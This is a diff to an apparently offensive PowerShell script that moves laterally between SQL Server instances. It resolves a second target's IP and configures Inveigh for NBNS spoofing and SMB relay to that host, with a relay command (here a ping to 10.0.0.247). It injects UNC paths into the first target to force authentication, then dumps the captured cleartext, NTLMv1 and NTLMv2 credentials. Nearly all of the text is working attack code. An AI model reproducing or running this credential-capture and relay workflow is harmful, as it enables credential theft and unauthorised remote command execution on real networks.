@@ -68,6 +68,7 @@ if(-not $x){
 
             # set target 2
             $target2 = $AccessibleInstances | ? {$_.computername -ne "$target1Computer"} | select instance -First 1 -ExpandProperty instance
+            $target2ip = Resolve-DnsName $target2 | select IPaddress -ExpandProperty ipaddress
             write-output "$sharedaccount : $target2 set to target2" 
 
             #-----------------
@@ -75,12 +76,11 @@ if(-not $x){
             #-----------------
             # - import inveigh
             # sniff and set relay target to target2
-            Write-Output "$sharedaccount : Starting sniffer"
-            Clear-Inveigh | Out-Null
-            Invoke-Inveigh -NBNS Y -SpooferHostsReply $target2 | Out-Null 
+            Write-Output "$sharedaccount : Starting sniffer"            
+            Invoke-Inveigh -SMBRelay Y -SMBRelayTarget $target2ip -SMBRelayCommand "ping  10.0.0.247" -SpooferHostsReply $target1 -NBNS Y | Out-Null 
 
             # unc path injection for each ip
-            Write-Output "$sharedaccount : Injecting UNC path into $target2"
+            Write-Output "$sharedaccount : Injecting UNC path into $target1"
             Get-NetIPAddress | select ipaddress | %{         
                 $IP = $_.IPAddress
                 # unc path inject into target1
@@ -91,14 +91,15 @@ if(-not $x){
             sleep 5
 
             # check for win
-            Write-Output "$sharedaccount : Checking for credentials"
+            Write-Output "$sharedaccount : Checking for credentials captured during unc injection from $target1"
             Get-InveighCleartext 
             Get-InveighNTLMv1
             Get-InveighNTLMv2
 
             # on file goto next            
             Stop-Inveigh | Out-Null
-             Write-Output "$sharedaccount : Stopping sniffer"
+            Clear-Inveigh | Out-Null
+            Write-Output "$sharedaccount : Stopping sniffer"
         
         }else{
 
